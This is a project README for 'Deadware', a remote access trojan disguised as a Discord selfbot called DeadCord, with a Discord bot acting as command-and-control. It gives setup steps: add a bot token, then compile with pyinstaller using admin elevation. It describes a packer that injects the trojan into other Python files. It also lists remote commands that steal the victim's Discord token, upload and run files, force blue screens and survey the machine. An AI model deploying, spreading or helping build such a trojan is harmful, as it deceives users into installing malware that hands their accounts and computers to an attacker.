# Deadware
Discord Server: [Invite](https://discord.gg/VkF6ZefJyx)

Deadware is a RAT disguised as a fully functioning Selfbot. It uses a Discord server and bot as a C&C while the `deadcord.py` being the payload. The command prefix for the bot is `d!` and for the selfbot it is `.`

Deadware will consantly be updated as the project is a work in progress. Updates are to be released at least once every 2 weeks. If there is any bugs, please let me know so I can make a fix. 

## How to setup
1. Create a Discord Bot in the [Discord developer portal](https://discord.com/developers/applications)
2. In `deadcord.py` replace line `917` with your Discord Bot Token
3. Compile `deadcord.py` with pyinstaller. I would suggest using the following command in step 4 or you can run the `Builder.py` for speed
4. `pyinstaller deadcord.py --onefile --uac-admin`

## Deadware Info
`Packer.py` will inject the Deadware code into another python file.

As mentioned, Deadware is disguised as a selfbot called `DeadCord` which is a fully functioning selfbot with over 75 commands. However, the real commands are in the Deadware bot. The following list is the up to date commands:

* test_con - tests connection
* create_file <filename> - creates a file
* start_process <process> - starts process
* computer_shutdown - shuts down computer
* deadware_bomb - messes with computer
* get_token - gets selfbot token
* start_typing <message> - opens notepad and types message
* get_ip - gets machine IP
* end_task <task> - ends a task
* get_tasks - gets current processes running
* get_netstat - gets netstat output
* blue_screen - forces a temp BSOD
* error_drawing - starts cursor drawing
* upload <uri> <filename> - uplaods a file and runs it
* cwd - gets currenct working directory
* dir - lists folders in directory
* ext_search <file extention> - searches for file with extention
* change_dir <folder> - changes file directory
 

 
 



 




